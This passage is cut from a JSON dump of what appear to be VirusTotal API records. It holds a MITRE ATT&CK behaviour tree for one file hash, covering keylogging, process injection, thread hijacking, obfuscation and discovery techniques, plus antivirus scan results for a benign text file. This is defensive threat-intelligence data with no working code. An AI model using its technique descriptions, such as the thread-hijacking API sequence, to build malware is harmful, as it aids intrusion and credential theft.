              },
              {
                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\nHooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\nReading raw keystroke data from the hardware buffer.\nWindows Registry modifications.\nCustom drivers.\nModify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions. \n",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "log keystrokes via polling"
                  },
                  {
                    "severity": "INFO",
                    "description": "log keystrokes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/001/",
                "id": "T1056.001",
                "name": "Keylogging"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "id": "TA0009",
            "name": "Collection"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "access PEB ldr_data"
                  },
                  {
                    "severity": "INFO",
                    "description": "link function at runtime on Windows"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              },
              {
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "accept command line arguments"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1059/",
                "id": "T1059",
                "name": "Command and Scripting Interpreter"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get disk information"
                  },
                  {
                    "severity": "INFO",
                    "description": "get hostname"
                  },
                  {
                    "severity": "INFO",
                    "description": "query environment variable"
                  },
                  {
                    "severity": "INFO",
                    "description": "check OS version"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get file size"
                  },
                  {
                    "severity": "INFO",
                    "description": "enumerate files on windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "enumerate files recursively"
                  },
                  {
                    "severity": "INFO",
                    "description": "get common file path"
                  },
                  {
                    "severity": "INFO",
                    "description": "check if file exists"
                  },
                  {
                    "severity": "INFO",
                    "description": "enumerate files on Windows"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "enumerate processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \nFile sharing over a Windows network occurs over the SMB protocol.   Net can be used to query a remote system for available shared drives using the net view \\\\remotesystem command. It can also be used to query shared drives on the local system using net share. For macOS, the sharing -l command lists all shared points used for smb services.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "enumerate network shares"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1135/",
                "id": "T1135",
                "name": "Network Share Discovery"
              },
              {
                "description": "Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, tracert, and GET requests to websites.\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "list domain servers"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1016/001/",
                "id": "T1016.001",
                "name": "Internet Connection Discovery"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "query or enumerate registry value"
                  },
                  {
                    "severity": "INFO",
                    "description": "query or enumerate registry key"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1012/",
                "id": "T1012",
                "name": "Query Registry"
              },
              {
                "description": "Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions. \nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language or parsing the outputs of Windows API functions GetUserDefaultUILanguage, GetSystemDefaultUILanguage, GetKeyboardLayoutList and GetUserDefaultLangID.\nOn a macOS or Linux system, adversaries may query locale to retrieve the value of the $LANG environment variable.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get keyboard layout"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1614/001/",
                "id": "T1614.001",
                "name": "System Language Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "enumerate processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/",
                "id": "T1518",
                "name": "Software Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\nHooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\nReading raw keystroke data from the hardware buffer.\nWindows Registry modifications.\nCustom drivers.\nModify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions. \n",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "log keystrokes via polling"
                  },
                  {
                    "severity": "INFO",
                    "description": "log keystrokes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/001/",
                "id": "T1056.001",
                "name": "Keylogging"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "id": "TA0006",
            "name": "Credential Access"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point the process can be suspended then written to, realigned to the injected code, and resumed via SuspendThread , VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.\nThis is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.  \nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "inject thread"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/003/",
                "id": "T1055.003",
                "name": "Thread Execution Hijacking"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "delete registry value"
                  },
                  {
                    "severity": "INFO",
                    "description": "delete registry key"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1112/",
                "id": "T1112",
                "name": "Modify Registry"
              },
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "write process memory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).\nReflective code injection is very similar to Process Injection except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "inject thread"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1620/",
                "id": "T1620",
                "name": "Reflective Code Loading"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "encode data using XOR"
                  },
                  {
                    "severity": "INFO",
                    "description": "encrypt data using RC4 PRGA"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              },
              {
                "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include del on Windows and rm or unlink on Linux and macOS.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "self delete"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1070/004/",
                "id": "T1070.004",
                "name": "File Deletion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point the process can be suspended then written to, realigned to the injected code, and resumed via SuspendThread , VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.\nThis is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.  \nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "inject thread"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/003/",
                "id": "T1055.003",
                "name": "Thread Execution Hijacking"
              },
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "write process memory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/c5119b8a75d4965e51e7424964bf92f2708b099a4e6049b13f8aaddabfb6860e/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65a02d52dd3d89957362df5f"
  },
  "data": {
    "attributes": {
      "type_description": "Text",
      "tlsh": "TNULL",
      "type_tags": [
        "text"
      ],
      "names": [
        "first_file.txt",
        "input.txt",
        "sample_text_file.txt"
      ],
      "last_modification_date": 1703234147,
      "type_tag": "text",
      "times_submitted": 3,
      "total_votes": {
        "harmless": 3,
        "malicious": 0
      },
      "size": 44,
      "type_extension": "txt",
      "last_submission_date": 1677581214,
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.1.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "FireEye": {
          "category": "undetected",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230817"
        },
        "McAfee": {
          "category": "failure",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.108.49319",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.108.49319",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230810"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.516",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Cyren": {
          "category": "undetected",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.104",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230809"
        },
        "ESET-NOD32": {
          "category": "undetected",
          "engine_name": "ESET-NOD32",
          "engine_version": "27762",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.444",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230816"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Avast": {
          "category": "undetected",
          "engine_name": "Avast",
          "engine_version": "23.8.8378.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4940",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "McAfee-GW-Edition": {
          "category": "undetected",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.3.0.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230705"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.90",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230718"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230619"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "6.1.14.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "GData": {
          "category": "undetected",
          "engine_name": "GData",
          "engine_version": "A:25.36378B:27.32823",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.134.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "35925",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230805"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230817"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "230818-02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
